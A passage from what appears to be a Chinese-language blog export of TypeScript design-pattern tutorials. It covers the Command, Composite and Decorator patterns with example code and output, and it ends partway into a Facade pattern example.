<h5 id="result"><a href="#result" class="headerlink" title="result"></a>result</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Trouble 0] is resolved by [Bob]</span><br><span class="line">[Trouble 33] is resolved by [Bob]</span><br><span class="line">[Trouble 66] is resolved by [Bob]</span><br><span class="line">[Trouble 99] is resolved by [Bob]</span><br><span class="line">[Trouble 132] is resolved by [Diana]</span><br><span class="line">[Trouble 165] is resolved by [Diana]</span><br><span class="line">[Trouble 198] is resolved by [Diana]</span><br><span class="line">[Trouble 231] is resolved by [Elmo]</span><br><span class="line">[Trouble 264] is resolved by [Fred]</span><br><span class="line">[Trouble 297] is resolved by [Elmo]</span><br><span class="line">[Trouble 330] canot be resolved</span><br><span class="line">[Trouble 363] is resolved by [Elmo]</span><br><span class="line">[Trouble 396] canot be resolved</span><br><span class="line">[Trouble 429] is resolved by [Charlie]</span><br><span class="line">[Trouble 462] canot be resolved</span><br><span class="line">[Trouble 495] is resolved by [Elmo]</span><br></pre></td></tr></table></figure>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://upload-images.jianshu.io/upload_images/10024246-173035b742289356.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="类图"></p>
<h2 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h2><ul>
<li>Handler（处理者）<br>Handler定义了处理请求的具体接口，Handler知道下一个处理者是谁，当无法处理时会把事件转给下一个处理者，当然先一个处理者也是Handler角色</li>
<li>ConcreteHandler（具体的处理者）<br>ConcreteHandler是处理请求的具体角色</li>
<li>Client（请求者）<br>事件发起者</li>
</ul>
]]></content>
      <categories>
        <category>DesignPattern</category>
      </categories>
  </entry>
  <entry>
    <title>Command模式（命令模式）</title>
    <url>/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Command%E6%A8%A1%E5%BC%8F%EF%BC%88%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F%EF%BC%89/</url>
    <content><![CDATA[<p>命令模式（Command Pattern）是一种数据驱动的设计模式。Command有时也被成为事件（event）。它与“事件驱动编程”中的事件是一样的意思。</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul>
<li>意图：将一个请求封装成一个对象，从而使您可以用不同的请求对客户进行参数化。</li>
<li>主要解决：在软件系统中，行为请求者与行为实现者通常是一种紧耦合的关系，但某些场合，比如需要对行为进行记录、撤销或重做、事务等处理时，这种无法抵御变化的紧耦合的设计就不太合适。</li>
<li>何时使用：在某些场合，比如要对行为进行”记录、撤销/重做、事务”等处理，这种无法抵御变化的紧耦合是不合适的。在这种情况下，如何将”行为请求者”与”行为实现者”解耦？将一组行为抽象为对象，可以实现二者之间的松耦合。</li>
<li>如何解决：通过调用者调用接受者执行命令，顺序：调用者→命令→接受者。</li>
<li>关键代码：定义三个角色：<br>1、received 真正的命令执行对象<br>2、Command<br>3、invoker 使用命令对象的入口</li>
<li>优点： 1、降低了系统耦合度。 2、新的命令可以很容易添加到系统中去。</li>
<li>缺点：使用命令模式可能会导致某些系统有过多的具体命令类。</li>
<li>注意事项：系统需要支持命令的撤销(Undo)操作和恢复(Redo)操作，也可以考虑使用命令模式，见命令模式的扩展。</li>
<li>命令模式结构示意图:</li>
</ul>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-ba053c9ac15c7266.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="类图"></p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h5 id="order-ts-command接口"><a href="#order-ts-command接口" class="headerlink" title="order.ts command接口"></a>order.ts command接口</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export interface Order &#123;</span><br><span class="line">    execute(): void;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="Stock-ts-请求类"><a href="#Stock-ts-请求类" class="headerlink" title="Stock.ts 请求类"></a>Stock.ts 请求类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export default class Stock &#123;</span><br><span class="line">    private name: string &#x3D; &quot;ABC&quot;;</span><br><span class="line">    private quantity: number &#x3D; 10;</span><br><span class="line">    public buy(): void &#123;</span><br><span class="line">        console.log(&#96;Stock [ Name: $&#123;this.name&#125; Quantity: $&#123;this.quantity&#125; ] bought&#96;);</span><br><span class="line">    &#125;</span><br><span class="line">    public sell(): void &#123;</span><br><span class="line">        console.log(&#96;Stock [ Name: $&#123;this.name&#125; Quantity: $&#123;this.quantity&#125; ] sold&#96;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="买卖股票实现了-Order-接口"><a href="#买卖股票实现了-Order-接口" class="headerlink" title="买卖股票实现了 Order 接口"></a>买卖股票实现了 Order 接口</h5><ul>
<li>BuyStock.ts 买股票*<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;Order.ts 买股票</span><br><span class="line">import &#123; Order &#125; from &quot;.&#x2F;Order&quot;;</span><br><span class="line">import Stock from &quot;.&#x2F;Stock&quot;;</span><br><span class="line"></span><br><span class="line">export default class BuyStock implements Order &#123;</span><br><span class="line">    private abcStock: Stock;</span><br><span class="line"></span><br><span class="line">    constructor(abcStock: Stock) &#123;</span><br><span class="line">        this.abcStock &#x3D; abcStock;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public execute(): void &#123;</span><br><span class="line">        this.abcStock.buy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>SellStock.ts卖股票*<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;SellStock.ts卖股票</span><br><span class="line">import &#123; Order &#125; from &quot;.&#x2F;Order&quot;;</span><br><span class="line">import Stock from &quot;.&#x2F;Stock&quot;;</span><br><span class="line"></span><br><span class="line">export default class SellStock implements Order &#123;</span><br><span class="line">    private abcStock: Stock;</span><br><span class="line"></span><br><span class="line">    constructor(abcStock: Stock) &#123;</span><br><span class="line">        this.abcStock &#x3D; abcStock;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public execute(): void &#123;</span><br><span class="line">        this.abcStock.sell();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="Broker-ts-经纪人创建命令"><a href="#Broker-ts-经纪人创建命令" class="headerlink" title="Broker.ts 经纪人创建命令"></a>Broker.ts 经纪人创建命令</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Order &#125; from &quot;.&#x2F;Order&quot;;</span><br><span class="line"></span><br><span class="line">export default class Broker &#123;</span><br><span class="line">    private orderList: Array&lt;Order&gt; &#x3D; new Array&lt;Order&gt;();</span><br><span class="line"></span><br><span class="line">    public takeOrder(order: Order): void &#123;</span><br><span class="line">        this.orderList.push(order);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public placeOrders(): void &#123;</span><br><span class="line">        this.orderList.forEach((order: Order) &#x3D;&gt; &#123;</span><br><span class="line">            order.execute();</span><br><span class="line">        &#125;)</span><br><span class="line">        this.orderList &#x3D; [];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="index-ts"><a href="#index-ts" class="headerlink" title="index.ts"></a>index.ts</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Broker from &quot;.&#x2F;Broker&quot;;</span><br><span class="line">import Stock from &quot;.&#x2F;Stock&quot;;</span><br><span class="line">import BuyStock from &quot;.&#x2F;BuyStock&quot;;</span><br><span class="line">import SellStock from &quot;.&#x2F;SellStock&quot;;</span><br><span class="line"></span><br><span class="line">const abcStock: Stock &#x3D; new Stock();</span><br><span class="line"></span><br><span class="line">const buyStockOrder: BuyStock &#x3D; new BuyStock(abcStock);</span><br><span class="line">const sellStockOrder: SellStock &#x3D; new SellStock(abcStock);</span><br><span class="line"></span><br><span class="line">const broker: Broker &#x3D; new Broker();</span><br><span class="line">broker.takeOrder(buyStockOrder);</span><br><span class="line">broker.takeOrder(sellStockOrder);</span><br><span class="line"></span><br><span class="line">broker.placeOrders();</span><br></pre></td></tr></table></figure>
<h5 id="result"><a href="#result" class="headerlink" title="result"></a>result</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Stock [ Name: ABC Quantity: 10 ] bought</span><br><span class="line">Stock [ Name: ABC Quantity: 10 ] sold</span><br></pre></td></tr></table></figure>
<h2 id="Command模式中的角色"><a href="#Command模式中的角色" class="headerlink" title="Command模式中的角色"></a>Command模式中的角色</h2></li>
</ul>
<ul>
<li>Command(命令)<br>Command角色负责定义命令的接口，对应Order接口</li>
<li>ConcreteCommand （具体的命令）<br>ConcreteCommand角色负责试下在Command角色中定义的接口。对应BuyStock和SellStock</li>
<li>Receiver（接收者）<br>Receiver角色时Command角色执行命令接受者</li>
<li>Client（请求者）<br>Client角色负责生产ConcreteCommand角色并分配Receiver角色</li>
<li>Invoke（发动者）<br>Invoke角色时开始执行命令的角色，它会调用Command角色中定义的接口</li>
</ul>
]]></content>
      <categories>
        <category>DesignPattern</category>
      </categories>
  </entry>
  <entry>
    <title>Composite模式（组合实体模式）</title>
    <url>/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Composite%E6%A8%A1%E5%BC%8F%EF%BC%88%E7%BB%84%E5%90%88%E5%AE%9E%E4%BD%93%E6%A8%A1%E5%BC%8F%EF%BC%89/</url>
    <content><![CDATA[<h2 id="组合实体模式"><a href="#组合实体模式" class="headerlink" title="组合实体模式"></a>组合实体模式</h2><p>组合实体模式（Composite Entity Pattern）能够是容器和内容具有一致性，创造出递归结构的模式。<br>常见使用场景：如树形菜单、文件夹菜单、部门组织架构图等。</p>
<h2 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h2><h3 id="Component-抽象类"><a href="#Component-抽象类" class="headerlink" title="Component:抽象类"></a>Component:抽象类</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export default abstract class Component &#123;</span><br><span class="line">    public abstract Opertion(): void; &#x2F;&#x2F;操作</span><br><span class="line">    public abstract Add(Child: Component): void;&#x2F;&#x2F;添加子节点</span><br><span class="line">    public abstract Remove(index: number): void;&#x2F;&#x2F;删除节点</span><br><span class="line">    public abstract getChild(index: number): Array&lt;Component&gt;;&#x2F;&#x2F;获取子节点</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Leaf-叶子类"><a href="#Leaf-叶子类" class="headerlink" title="Leaf:叶子类"></a>Leaf:叶子类</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Component from &quot;.&#x2F;Component&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">export default class Leaf extends Component &#123;</span><br><span class="line"></span><br><span class="line">    private leafName: string;</span><br><span class="line"></span><br><span class="line">    constructor(leafName: string) &#123;</span><br><span class="line">        super();</span><br><span class="line">        this.leafName &#x3D; leafName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Opertion(): void &#123;</span><br><span class="line">        console.log(this.leafName + &quot;正在迎风摇摆&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Add(Child: Component): void &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Remove(index: number): void &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public getChild(index: number): Array&lt;Component&gt; &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Trunk-树干类"><a href="#Trunk-树干类" class="headerlink" title="Trunk:树干类"></a>Trunk:树干类</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Component from &quot;.&#x2F;Component&quot;;</span><br><span class="line"></span><br><span class="line">export default class Trunk extends Component &#123;</span><br><span class="line"></span><br><span class="line">    private TrunkName: string;</span><br><span class="line"></span><br><span class="line">    private components: Array&lt;Component&gt; &#x3D; []; &#x2F;&#x2F;多个子节点</span><br><span class="line"></span><br><span class="line">    constructor(TrunkName: string) &#123;</span><br><span class="line">        super();</span><br><span class="line">        this.TrunkName &#x3D; TrunkName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Opertion(): void &#123;</span><br><span class="line">        console.log(this.TrunkName + &quot;树干正在抵御秋风&quot;);</span><br><span class="line">        this.components.forEach((item, index) &#x3D;&gt; &#123;</span><br><span class="line">            item.Opertion();</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Add(Child: Component): void &#123;</span><br><span class="line">        this.components.push(Child);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Remove(index: number): void &#123;</span><br><span class="line">        this.components.splice(index, 1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public getChild(index: number): Array&lt;Component&gt; &#123;</span><br><span class="line">        return this.components;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="index-ts"><a href="#index-ts" class="headerlink" title="index.ts"></a>index.ts</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Trunk from &quot;.&#x2F;Trunk&quot;;</span><br><span class="line">import Leaf from &quot;.&#x2F;Leaf&quot;;</span><br><span class="line"></span><br><span class="line">const root: Trunk &#x3D; new Trunk(&quot;树根&quot;);</span><br><span class="line"></span><br><span class="line">const trunk: Trunk &#x3D; new Trunk(&quot;主干&quot;);</span><br><span class="line"></span><br><span class="line">const t1: Trunk &#x3D; new Trunk(&quot;主分支&quot;);</span><br><span class="line">const t2: Trunk &#x3D; new Trunk(&quot;第一分支&quot;);</span><br><span class="line">const t3: Trunk &#x3D; new Trunk(&quot;第二分支&quot;);</span><br><span class="line"></span><br><span class="line">const l1: Leaf &#x3D; new Leaf(&quot;分叶1&quot;);</span><br><span class="line">const l2: Leaf &#x3D; new Leaf(&quot;分叶2&quot;);</span><br><span class="line">const l3: Leaf &#x3D; new Leaf(&quot;分叶3&quot;);</span><br><span class="line">const l4: Leaf &#x3D; new Leaf(&quot;分叶4&quot;);</span><br><span class="line">const l5: Leaf &#x3D; new Leaf(&quot;分叶5&quot;);</span><br><span class="line"></span><br><span class="line">root.Add(trunk);</span><br><span class="line">trunk.Add(t1);</span><br><span class="line"></span><br><span class="line">t1.Add(t2);</span><br><span class="line">t1.Add(t3);</span><br><span class="line"></span><br><span class="line">t2.Add(l1);</span><br><span class="line">t2.Add(l3);</span><br><span class="line">t2.Add(l5);</span><br><span class="line"></span><br><span class="line">t3.Add(l2);</span><br><span class="line">t3.Add(l4);</span><br><span class="line"></span><br><span class="line">root.Opertion();</span><br></pre></td></tr></table></figure>
<h3 id="result"><a href="#result" class="headerlink" title="result"></a>result</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">树根树干正在抵御秋风</span><br><span class="line">主干树干正在抵御秋风</span><br><span class="line">主分支树干正在抵御秋风</span><br><span class="line">第一分支树干正在抵御秋风</span><br><span class="line">分叶1正在迎风摇摆</span><br><span class="line">分叶3正在迎风摇摆</span><br><span class="line">分叶5正在迎风摇摆</span><br><span class="line">第二分支树干正在抵御秋风</span><br><span class="line">分叶2正在迎风摇摆</span><br><span class="line">分叶4正在迎风摇摆</span><br></pre></td></tr></table></figure>
<h3 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h3><p><img src="https://upload-images.jianshu.io/upload_images/10024246-d9e5cb13d2a82048.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="类图"></p>
<h3 id="composite模式"><a href="#composite模式" class="headerlink" title="composite模式"></a>composite模式</h3><p>composite模式主要有一下几类角色</p>
<ul>
<li>leaf 树叶<br>表示内容的角色，该角色中不能放入其他对象，对应我们实例程序中的leaf</li>
<li>Composite 复合物<br>表示容器的角色，可以放入小容器和内容，也就是leaf和composite，此实例中，由Trunk类代表composite</li>
<li>component<br>是leaf和composite角色具有一致性的角色，一般作为leaf和composite的父类，定义一些共有的行为和属性，此例中的component类代表</li>
</ul>
]]></content>
      <categories>
        <category>DesignPattern</category>
      </categories>
  </entry>
  <entry>
    <title>Decorator模式（装饰器模式）</title>
    <url>/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Decorator%E6%A8%A1%E5%BC%8F%EF%BC%88%E8%A3%85%E9%A5%B0%E5%99%A8%E6%A8%A1%E5%BC%8F%EF%BC%89/</url>
    <content><![CDATA[<p>装饰器模式（Decorator Pattern）允许向一个现有的对象添加新的功能，同时又不改变其结构。这种类型的设计模式属于结构型模式，它是作为现有的类的一个包装。</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul>
<li>意图：动态地给一个对象添加一些额外的职责。就增加功能来说，装饰器模式相比生成子类更为灵活。</li>
<li>主要解决：一般的，我们为了扩展一个类经常使用继承方式实现，由于继承为类引入静态特征，并且随着扩展功能的增多，子类会很膨胀。</li>
<li>优点：装饰类和被装饰类可以独立发展，不会相互耦合，装饰模式是继承的一个替代模式，装饰模式可以动态扩展一个实现类的功能。</li>
<li>缺点：</li>
</ul>
<p>1.多层装饰比较复杂。<br>2.会导致程序中增加很多功能类似的很小的类</p>
<ul>
<li>使用场景：<br>1、扩展一个类的功能。<br>2、动态增加功能，动态撤销。</li>
</ul>
<p><em>注意事项：可代替继承。</em></p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h5 id="Display-ts-用于显示字符串的抽象类"><a href="#Display-ts-用于显示字符串的抽象类" class="headerlink" title="Display.ts 用于显示字符串的抽象类"></a>Display.ts 用于显示字符串的抽象类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export default abstract class Display &#123;</span><br><span class="line">    public abstract getColumns(): number;&#x2F;&#x2F;获取横向字符数</span><br><span class="line">    public abstract getRows(): number;&#x2F;&#x2F;获取纵向行数</span><br><span class="line">    public abstract getRowText(row: number): string;&#x2F;&#x2F;获取第row行的字符串</span><br><span class="line">    &#x2F;**</span><br><span class="line">      *显示所有字符</span><br><span class="line">    *&#x2F;</span><br><span class="line">    public show(): void &#123;</span><br><span class="line">        for (let i &#x3D; 0; i &lt; this.getRows(); i++) &#123;</span><br><span class="line">            console.log(this.getRowText(i));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="StringDisplay-ts-用于显示单行字符串的类"><a href="#StringDisplay-ts-用于显示单行字符串的类" class="headerlink" title="StringDisplay.ts 用于显示单行字符串的类"></a>StringDisplay.ts 用于显示单行字符串的类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Display from &quot;.&#x2F;Display&quot;;</span><br><span class="line"></span><br><span class="line">export default class StringDisplay extends Display &#123;</span><br><span class="line">    private str: string;&#x2F;&#x2F;要显示的字符串</span><br><span class="line">    constructor(str: string) &#123;</span><br><span class="line">        super();</span><br><span class="line">        this.str &#x3D; str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public getColumns(): number &#123;&#x2F;&#x2F;字符数</span><br><span class="line">        return this.str.length;</span><br><span class="line">    &#125;</span><br><span class="line">    public getRows(): number &#123;&#x2F;&#x2F;行数1</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    public getRowText(row: number): string &#123;&#x2F;&#x2F;只显示第一行</span><br><span class="line">        if (row &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            return this.str;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="Border-ts-用于显示装饰边框的抽象类"><a href="#Border-ts-用于显示装饰边框的抽象类" class="headerlink" title="Border.ts 用于显示装饰边框的抽象类"></a>Border.ts 用于显示装饰边框的抽象类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Display from &quot;.&#x2F;Display&quot;;</span><br><span class="line"></span><br><span class="line">export default abstract class Border extends Display &#123;</span><br><span class="line">    protected display: Display;&#x2F;&#x2F;装饰物</span><br><span class="line">    constructor(display: Display) &#123;</span><br><span class="line">        super();</span><br><span class="line">        this.display &#x3D; display;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="SideBorder-ts-用于显示左右边框的类"><a href="#SideBorder-ts-用于显示左右边框的类" class="headerlink" title="SideBorder.ts 用于显示左右边框的类"></a>SideBorder.ts 用于显示左右边框的类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Display from &quot;.&#x2F;Display&quot;;</span><br><span class="line">import Border from &quot;.&#x2F;Border&quot;;</span><br><span class="line"></span><br><span class="line">export default class SideBorder extends Border &#123;</span><br><span class="line">    private borderChar: string;&#x2F;&#x2F;装饰边框的字符</span><br><span class="line">    constructor(display: Display, ch: string) &#123;&#x2F;&#x2F;指定Display和装饰边框字符</span><br><span class="line">        super(display);</span><br><span class="line">        this.borderChar &#x3D; ch;</span><br><span class="line">    &#125;</span><br><span class="line">    public getColumns(): number &#123;</span><br><span class="line">        return 1 + this.display.getColumns() + 1;&#x2F;&#x2F;字符数加上两侧边框的字符数</span><br><span class="line">    &#125;</span><br><span class="line">    public getRows(): number &#123;</span><br><span class="line">        return this.display.getRows();</span><br><span class="line">    &#125;</span><br><span class="line">    public getRowText(row: number) &#123;&#x2F;&#x2F;字符串加上边框</span><br><span class="line">        return this.borderChar + this.display.getRowText(row) + this.borderChar;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="FullBorder-ts-显示上下左右边框"><a href="#FullBorder-ts-显示上下左右边框" class="headerlink" title="FullBorder.ts  显示上下左右边框"></a>FullBorder.ts  显示上下左右边框</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Display from &quot;.&#x2F;Display&quot;;</span><br><span class="line">import Border from &quot;.&#x2F;Border&quot;;</span><br><span class="line"></span><br><span class="line">export default class FullBorder extends Border &#123;</span><br><span class="line">    constructor(display: Display) &#123;</span><br><span class="line">        super(display);</span><br><span class="line">    &#125;</span><br><span class="line">    public getColumns(): number &#123;</span><br><span class="line">        return 1 + this.display.getColumns() + 1;&#x2F;&#x2F;增加左右边框字符数</span><br><span class="line">    &#125;</span><br><span class="line">    public getRows(): number &#123;</span><br><span class="line">        return this.display.getRows() + 2;&#x2F;&#x2F;增加上下边框字符数</span><br><span class="line">    &#125;</span><br><span class="line">    public getRowText(row: number) &#123;</span><br><span class="line">        if (row &#x3D;&#x3D; 0 || row &#x3D;&#x3D; this.display.getRows() + 1) &#123;&#x2F;&#x2F;上线边框</span><br><span class="line">            return &#96;+$&#123;this.makeLine(&#39;-&#39;, this.display.getColumns())&#125;+&#96;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return &#96;|$&#123;this.display.getRowText(row - 1)&#125;|&#96;;&#x2F;&#x2F;左右边框</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    private makeLine(ch: string, count: number) &#123;</span><br><span class="line">        let str &#x3D; &quot;&quot;;</span><br><span class="line">        for (let i &#x3D; 0; i &lt; count; i++) &#123;</span><br><span class="line">            str &#x3D; str + ch;</span><br><span class="line">        &#125;</span><br><span class="line">        return str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="index-ts"><a href="#index-ts" class="headerlink" title="index.ts"></a>index.ts</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Display from &quot;.&#x2F;Display&quot;;</span><br><span class="line">import StringDisplay from &quot;.&#x2F;StringDisplay&quot;;</span><br><span class="line">import SideBorder from &quot;.&#x2F;SideBorder&quot;;</span><br><span class="line">import FullBorder from &quot;.&#x2F;FullBorder&quot;;</span><br><span class="line"></span><br><span class="line">const b1: Display &#x3D; new StringDisplay(&quot;Hello,World.&quot;);&#x2F;&#x2F;直接显示</span><br><span class="line">const b2: Display &#x3D; new SideBorder(b1, &#39;#&#39;);&#x2F;&#x2F;增加左右边框&#39;#&#39;</span><br><span class="line">const b3: Display &#x3D; new FullBorder(b2);&#x2F;&#x2F;上下左右都加边框</span><br><span class="line"></span><br><span class="line">b1.show();</span><br><span class="line">b2.show();</span><br><span class="line">b3.show();</span><br><span class="line"></span><br><span class="line">const b4: Display &#x3D; new SideBorder(&#x2F;&#x2F;多层边框</span><br><span class="line">    new FullBorder(</span><br><span class="line">        new FullBorder(</span><br><span class="line">            new SideBorder(</span><br><span class="line">                new FullBorder(new StringDisplay(&quot;Hello,World.&quot;)), &quot;*&quot;</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    ), &quot;&#x2F;&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">b4.show();</span><br></pre></td></tr></table></figure>
<h5 id="result"><a href="#result" class="headerlink" title="result"></a>result</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello,World.                       &#x2F;&#x2F;b1</span><br><span class="line">#Hello,World.#                     &#x2F;&#x2F;b2   </span><br><span class="line">+--------------+                  &#x2F;&#x2F;b3</span><br><span class="line">|#Hello,World.#|</span><br><span class="line">+--------------+</span><br><span class="line">&#x2F;+------------------+&#x2F;            &#x2F;&#x2F;b4</span><br><span class="line">&#x2F;|+----------------+|&#x2F;</span><br><span class="line">&#x2F;||*+------------+*||&#x2F;</span><br><span class="line">&#x2F;||*|Hello,World.|*||&#x2F;</span><br><span class="line">&#x2F;||*+------------+*||&#x2F;</span><br><span class="line">&#x2F;|+----------------+|&#x2F;</span><br><span class="line">&#x2F;+------------------+&#x2F;</span><br></pre></td></tr></table></figure>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://upload-images.jianshu.io/upload_images/10024246-4099bfc084274a3f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="类图"></p>
<h2 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h2><ul>
<li>Component<br>增加功能时的核心角色。示例中Display类扮演该角色</li>
<li>ConcreteComponent<br>该角色实现了Component角色定义的接口。在示例中StringDisplay类扮演该角色</li>
<li>Decorator（装饰物）<br>该角色具有与Component角色相同的接口，在内部保存了了被装饰的对象-&gt;Component。Decorator橘色知道自己要装饰的对象。在示例中，Border类扮演该角色</li>
<li>ConcreteDecorator（具体的装饰物）<br>该角色是具体的Decorator角色，示例中SideBorder类和FullBorder类扮演该角色</li>
</ul>
]]></content>
      <categories>
        <category>DesignPattern</category>
      </categories>
  </entry>
  <entry>
    <title>Facade模式（门面模式）</title>
    <url>/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Facade%E6%A8%A1%E5%BC%8F%EF%BC%88%E9%97%A8%E9%9D%A2%E6%A8%A1%E5%BC%8F%EF%BC%89/</url>
    <content><![CDATA[<p>门面模式（Facade Pattern）：互相关联的复杂类，统一整合出对外部暴露可以访问系统的接口。这种类型的设计模式属于结构型模式，它向现有的系统添加一个接口，来隐藏系统的复杂性。</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul>
<li><strong>意图：</strong>为子系统中的一组接口提供一个一致的界面，门面模式定义了一个高层接口。</li>
<li><strong>主要解决：</strong>降低访问复杂系统的内部子系统时的复杂度，简化客户端与之的接口。</li>
<li><strong>何时使用：</strong><br>1、客户端不需要知道系统内部的复杂联系，整个系统只需提供一个”接待员”即可。<br>2、定义系统的入口。</li>
<li> <strong>优点：</strong><br>1、减少系统相互依赖。<br>2、提高灵活性。<br>3、提高了安全性。</li>
<li><strong>缺点：</strong>不符合开闭原则，如果要改东西很麻烦，继承重写都不合适。</li>
<li><strong>使用场景：</strong><br>1、为复杂的模块或子系统提供外界访问的模块。<br>2、子系统相对独立。<br>3、预防低水平人员带来的风险。</li>
</ul>
<p><em>注意事项：在层次化结构中，可以使用外观模式定义系统中每一层的入口。</em></p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h5 id="Shape-ts-模型接口"><a href="#Shape-ts-模型接口" class="headerlink" title="Shape.ts 模型接口"></a>Shape.ts 模型接口</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export interface Shape &#123;</span><br><span class="line">    draw(): void;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="Rectangle-ts-矩形类"><a href="#Rectangle-ts-矩形类" class="headerlink" title="Rectangle.ts 矩形类"></a>Rectangle.ts 矩形类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Shape &#125; from &quot;.&#x2F;Shape&quot;;</span><br><span class="line"></span><br><span class="line">export default class Rectangle implements Shape &#123;</span><br><span class="line">    public draw(): void &#123;</span><br><span class="line">        console.log(&quot;Rectangle::draw()&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
